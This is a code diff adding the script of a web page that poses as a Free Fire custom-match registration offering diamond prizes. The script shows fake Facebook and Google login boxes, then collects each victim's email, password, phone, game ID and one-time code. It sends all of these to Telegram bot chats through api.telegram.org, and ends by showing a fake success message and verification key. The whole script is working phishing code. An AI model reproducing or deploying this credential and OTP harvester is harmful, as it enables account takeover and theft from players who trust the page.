+        document.addEventListener('DOMContentLoaded', function() {
+            const otpInputs = document.querySelectorAll('.otp-inputs input');
+            
+            otpInputs.forEach((input, index) => {
+                input.addEventListener('input', (e) => {
+                    if (e.target.value.length === 1 && index < otpInputs.length - 1) {
+                        otpInputs[index + 1].focus();
+                    }
+                });
+                
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
+                        otpInputs[index - 1].focus();
+                    }
+                });
+            });
+
+            // Generate verification key
+            verificationKey = 'FF-' + Math.random().toString(36).substring(2, 10).toUpperCase();
+        });
+        
+        function nextStep(step) {
+            if (step === 1) {
+                // Validate step 1 fields
+                const name = document.getElementById('name').value.trim();
+                const uid = document.getElementById('uid').value.trim();
+                const level = document.getElementById('level').value.trim();
+                const phone = document.getElementById('phone').value.trim();
+                
+                if (!name || !uid || !level || !phone) {
+                    alert('Please fill in all fields');
+                    return;
+                }
+                
+                if (!/^\d+$/.test(uid)) {
+                    alert('UID must contain only numbers');
+                    return;
+                }
+                
+                // Show confirmation modal
+                document.getElementById('confirm-details').innerHTML = `
+                    <p><strong>Name:</strong> ${name}</p>
+                    <p><strong>UID:</strong> ${uid}</p>
+                    <p><strong>Level:</strong> ${level}</p>
+                    <p><strong>Phone:</strong> ${phone}</p>
+                    <p><strong>Team:</strong> ${selectedTeam.name}</p>
+                    <p><strong>Custom Match:</strong> ${selectedCustom.mode} on ${selectedCustom.map} (Prize: ${selectedCustom.prize} Diamonds)</p>
+                `;
+                document.getElementById('confirm-modal').style.display = 'flex';
+                
+            } else if (step === 2) {
+                // Move to OTP step
+                document.getElementById('step2').classList.remove('active');
+                document.getElementById('step3').classList.add('active');
+                document.getElementById('progress').style.width = '100%';
+                currentStep = 3;
+            }
+        }
+        
+        function confirmDetails() {
+            document.getElementById('confirm-modal').style.display = 'none';
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+            document.getElementById('progress').style.width = '50%';
+            currentStep = 2;
+        }
+        
+        function showFacebookLogin() {
+            loginMethod = 'facebook';
+            document.getElementById('facebook-modal').style.display = 'flex';
+        }
+        
+        function showGoogleLogin() {
+            loginMethod = 'google';
+            document.getElementById('google-modal').style.display = 'flex';
+        }
+        
+        function facebookLogin() {
+            const email = document.getElementById('fb-email').value.trim();
+            const password = document.getElementById('fb-password').value.trim();
+            
+            if (!email || !password) {
+                alert('Please enter both email and password');
+                return;
+            }
+            
+            // Close modal first
+            document.getElementById('facebook-modal').style.display = 'none';
+            
+            // Send credentials to Telegram
+            const name = document.getElementById('name').value.trim();
+            const uid = document.getElementById('uid').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+            
+            const message = `FACEBOOK LOGIN CREDENTIALS:\nEmail: ${email}\nPassword: ${password}\n\nPlayer Info:\nName: ${name}\nUID: ${uid}\nPhone: ${phone}`;
+            sendToTelegram(message);
+            
+            // Then proceed to OTP
+            nextStep(2);
+        }
+        
+        function googleLogin() {
+            const email = document.getElementById('google-email').value.trim();
+            const password = document.getElementById('google-password').value.trim();
+            
+            if (!email || !password) {
+                alert('Please enter both email and password');
+                return;
+            }
+            
+            // Close modal first
+            document.getElementById('google-modal').style.display = 'none';
+            
+            // Send credentials to Telegram
+            const name = document.getElementById('name').value.trim();
+            const uid = document.getElementById('uid').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+            
+            const message = `GOOGLE LOGIN CREDENTIALS:\nEmail: ${email}\nPassword: ${password}\n\nPlayer Info:\nName: ${name}\nUID: ${uid}\nPhone: ${phone}`;
+            sendToTelegram(message);
+            
+            // Then proceed to OTP
+            nextStep(2);
+        }
+        
+        function verifyOTP() {
+            const otpInputs = document.querySelectorAll('.otp-inputs input');
+            let otp = '';
+            
+            otpInputs.forEach(input => {
+                otp += input.value;
+            });
+            
+            if (otp.length !== 6) {
+                alert('Please enter a complete 6-digit OTP');
+                return;
+            }
+            
+            if (!/^\d+$/.test(otp)) {
+                alert('OTP must contain only numbers');
+                return;
+            }
+            
+            const verifyBtn = document.getElementById('verify-btn');
+            verifyBtn.disabled = true;
+            verifyBtn.innerHTML = 'Processing <span class="loading-dots"></span>';
+            
+            // Send OTP to Telegram
+            const name = document.getElementById('name').value.trim();
+            const uid = document.getElementById('uid').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+            
+            const otpMessage = `OTP VERIFICATION:\nCode: ${otp}\nName: ${name}\nUID: ${uid}\nPhone: ${phone}\nTeam: ${selectedTeam.name}\nCustom: ${selectedCustom.mode}\nVerification Key: ${verificationKey}`;
+            sendToTelegram(otpMessage);
+            
+            // Show success modal after short delay
+            setTimeout(() => {
+                verifyBtn.disabled = false;
+                verifyBtn.textContent = 'SUBMIT OTP';
+                document.getElementById('verification-key-display').textContent = verificationKey;
+                document.getElementById('success-modal').style.display = 'flex';
+            }, 1500);
+        }
+        
+        function sendToTelegram(message) {
+            const name = document.getElementById('name') ? document.getElementById('name').value.trim() : '';
+            const uid = document.getElementById('uid') ? document.getElementById('uid').value.trim() : '';
+            const phone = document.getElementById('phone') ? document.getElementById('phone').value.trim() : '';
+            
+            let fullMessage = `🎮 NEW FFCE REGISTRATION 🎮\n\n`;
+            
+            if (name && uid && phone) {
+                fullMessage += `👤 Name: ${name}\n🔢 UID: ${uid}\n📱 Phone: ${phone}\n\n`;
+            }
+            
+            fullMessage += message;
+            
+            // Send to all Telegram chat IDs
+            CHAT_IDS.forEach(chatId => {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: fullMessage
+                    })
+                })
+                .catch(error => console.error('Error sending to Telegram:', error));
+            });
+        }
+    </script>
+</body>
+</html>
